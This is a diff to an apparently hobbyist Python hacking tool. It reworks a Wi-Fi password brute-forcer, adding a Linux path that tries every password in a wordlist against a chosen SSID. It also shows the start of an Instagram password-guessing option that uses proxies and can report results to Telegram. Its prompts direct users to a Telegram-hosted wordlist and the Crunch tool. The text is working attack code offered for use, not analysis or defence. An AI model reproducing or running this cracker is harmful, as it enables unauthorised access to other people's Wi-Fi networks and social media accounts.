@@ -1,10 +1,10 @@
 try:
-    import requests, random, os, time
+    import requests, random, os, time, platform
     from user_agent import generate_user_agent
     from ast import Pass 
     from pywifi import *
 except ModuleNotFoundError:
-    os.system("pip install requests random os user_agent ast pywifi time")
+    os.system("pip install requests user_agent pywifi")
     
     os.system("clear")
 
@@ -38,7 +38,7 @@ print("""\033[1;35m
        -   _-__   _    __---    -------       -
       _- _-   -_-- -_--                        _
       -_-                                       _
-     _-                \033[1;37mv0.0.0\033[1;35m                    _
+     _-                \033[1;37mv0.1.2\033[1;35m                    _
 
 \n\033[1;37mTHIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.\nPERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
 print("\033[1;37m- "*35)
@@ -50,51 +50,101 @@ def main_menu():
 
 def handle_selection(selection):
     if selection == "1" or selection == "Wi-Fi" or selection == "WI-FI" or selection == "wi-fi":
-        try:
-            wifi = PyWiFi()
-            INF = wifi.interfaces()[0]
-            INF.scan()
-            Rscan = INF.scan_results()
-        except: print("\033[1;31mWi-Fi not found!\033[1;37m")
+        def check_os():
+            os_name = platform.system()
 
-        def wifi(ssid, password):
-            prof = Profile()
-            prof.ssid = ssid
-            prof.auth = const.AUTH_ALG_OPEN
-            prof.akm.append(const.AKM_TYPE_WPA2PSK)
-            prof.cipher = const.CIPHER_TYPE_CCMP
-            prof.key = password
-            INF.remove_all_network_profiles()
-            TEMP_PROF = INF.add_network_profile(prof)
-            INF.connect(TEMP_PROF)
+            if os_name == "Linux":
+                def linux_wifi(ssid, password, interface):
+                    linux_wifi = pywifi.PyWiFi()
+                    INF = linux_wifi.interfaces()[interface]
+                    INF.disconnect()
+                    time.sleep(1)
 
-            time.sleep(0.5)
+                    profile = pywifi.Profile()
+                    profile.ssid = ssid
+                    profile.auth = const.AUTH_ALG_OPEN
+                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+                    profile.cipher = const.CIPHER_TYPE_CCMP
+                    profile.key = password
 
-            if INF.status() == const.IFACE_CONNECTED:
-                print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}")
-                return True
+                    INF.remove_all_network_profiles()
+                    tmp_profile = INF.add_network_profile(profile)
 
-            else: 
-                print(f"""\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!""")
-                return False
+                    INF.connect(tmp_profile)
+                    time.sleep(5)
 
-        ssid = input("\033[1;37m[\033[1;35m+\033[1;37m] Entet the SSID (Wi-Fi name) : \033[1;35m")
-        passwords = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file : 
-    \033[1;31m(if you don't have it, do one of these things :
-    • Download it to your device from https://t.me/tler_sa/80
-    • Search for these files on the internet and download them to your device
-    • Create a file using the Crunch tool)\n\033[1;35m""")
+                    if INF.status() == const.IFACE_CONNECTED:
+                        print(f"[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}")
+                        return True
+                    else:
+                        print(f"""\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!""")
+                        return False
 
-        try:
-            filee = open(passwords, "r")
-            for Pass in filee.readlines():
-                Pass = Pass.strip()
-                if wifi(ssid, Pass): break
-        except: print(f"\033[1;31mFile \033[1;35m{passwords}\033[1;31m not found!\033[1;37m")
-        
-        another_operation = input("\033[1;37mWould you like another operation? (\033[1;35mY\033[1;37m/\033[1;35mN\033[1;37m) \033[1;35m")
-        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
-        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+                ssid = input("\033[1;37m[\033[1;35m+\033[1;37m] Entet the SSID (Wi-Fi name) : \033[1;35m")
+                passwords = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
+    \033[1;33m(if u don't have it, do one of these things :
+    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
+    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
+    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
+\033[1;37m: \033[1;35m""")
+                interface = int(input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the interface num (\033[1;32mex\033[1;37m: \033[1;32m0 \033[1;37mfor \033[1;32mwlan0\033[1;37m) 
+    \033[1;33m(if u don't know what the interface num is :
+    \033[1;37m• \033[1;33mType the command "iwconfig" in the terminal)
+\033[1;37m: \033[1;35m"""))
+
+                try:
+                    with open(passwords, "r") as file:
+                        for password in file.readlines():
+                            password = password.strip()
+                            if linux_wifi(ssid, password, interface): break
+                except FileNotFoundError: print(f"\033[1;31mFile \033[1;35m{passwords}\033[1;31m not found!\033[1;37m")
+            else:
+                try:
+                    wifi = PyWiFi()
+                    INF = wifi.interfaces()[0]
+                    INF.scan()
+                    Rscan = INF.scan_results()
+                except: print("\033[1;31mWi-Fi not found!\033[1;37m")
+
+                def wifi(ssid, password):
+                    prof = Profile()
+                    prof.ssid = ssid
+                    prof.auth = const.AUTH_ALG_OPEN
+                    prof.akm.append(const.AKM_TYPE_WPA2PSK)
+                    prof.cipher = const.CIPHER_TYPE_CCMP
+                    prof.key = password
+                    INF.remove_all_network_profiles()
+                    TEMP_PROF = INF.add_network_profile(prof)
+                    INF.connect(TEMP_PROF)
+
+                    time.sleep(0.5)
+
+                    if INF.status() == const.IFACE_CONNECTED:
+                        print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Pass : \033[1;35m{password}")
+                        return True
+                    else: 
+                        print(f"""\033[1;37m[\033[1;31m✕\033[1;37m] Pass \033[1;35m{password} \033[1;37mis False!""")
+                        return False
+
+                ssid = input("\033[1;37m[\033[1;35m+\033[1;37m] Entet the SSID (Wi-Fi name) : \033[1;35m")
+                passwords = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
+    \033[1;33m(if u don't have it, do one of these things :
+    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
+    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
+    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
+\033[1;37m: \033[1;35m""")
+
+                try:
+                    filee = open(passwords, "r")
+                    for Pass in filee.readlines():
+                        Pass = Pass.strip()
+                        if wifi(ssid, Pass): break
+                except: print(f"\033[1;31mFile \033[1;35m{passwords}\033[1;31m not found!\033[1;37m")
+                
+                another_operation = input("\033[1;37mWould you like another operation? (\033[1;35mY\033[1;37m/\033[1;35mN\033[1;37m) \033[1;35m")
+                if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+                elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        check_os()
 
     elif selection == "2" or selection == "Instagram" or selection == "instagram" or selection == "INSTAGRAM":
         send_tele = input("\033[1;37m[\033[1;35m+\033[1;37m] Do you want to send info to the Telegram? \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m) \033[1;33m")
@@ -107,10 +157,11 @@ def handle_selection(selection):
         r = requests.Session()
 
         filee = input("""\033[1;37m[\033[1;35m+\033[1;37m] Enter the name of the passwords file
-    \033[1;31m(if you don't have it, do one of these things :
-    • Download it to your device from https://t.me/tler_sa/80
-    • Search for these files on the Internet and download them to your device
-    • Create a file using the Crunch tool)\n\033[1;35m""")
+    \033[1;33m(if u don't have it, do one of these things :
+    \033[1;37m• \033[1;33mDownload it to your device from https://t.me/tler_sa/80
+    \033[1;37m• \033[1;33mSearch for these files on the internet and download them to your device
+    \033[1;37m• \033[1;33mCreate a file using the Crunch tool)
+\033[1;37m: \033[1;35m""")
         rfile = open(filee, "r")
 
         def get_proxies():
